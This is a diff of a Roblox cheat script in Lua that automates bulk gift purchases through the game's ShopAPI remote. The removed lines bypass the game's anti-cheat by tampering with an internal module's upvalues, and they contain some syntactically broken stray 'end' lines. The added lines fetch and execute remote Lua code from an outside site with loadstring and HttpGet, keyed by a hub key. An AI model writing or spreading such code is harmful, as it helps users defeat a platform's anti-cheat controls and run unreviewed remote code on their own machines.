@@ -1,37 +1,16 @@
-local function rename(remotename, hashedremote)
-    hashedremote.Name = remotename
-end
+getgenv().hub_key = "ddefe568f4db2779d834b6cb6656f8ed"
+loadstring(game:HttpGet("https://nb0.xyz/scripts/2G_POTMACHINE2.lua"))()
+wait(10)
 
-local AC_MODULE = game:GetService("ReplicatedStorage").ClientModules.Core.RouterClient.RouterClient
-
-local initFunction = require(AC_MODULE).init
-local upvalueTable = getupvalue(initFunction, 7)
-
-if type(upvalueTable) == "table" then
-    table.foreach(upvalueTable, rename)
-else
-print("patch rip")
-end
-local args = {
-	"Parents",
-	{
-		source_for_logging = "intro_sequence",
-		dont_enter_location = true
-	}
-}
-game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer(unpack(args))
-end
-task.wait(10)
 local args = {
 "gifts",
 "smallgift",
 {
-buy_count = 1000
+buy_count = 200
 }
 }
 game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
-end
-task.wait(30)
+wait(20)
 local function open_all_smallgifts()
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
     local API = ReplicatedStorage.API
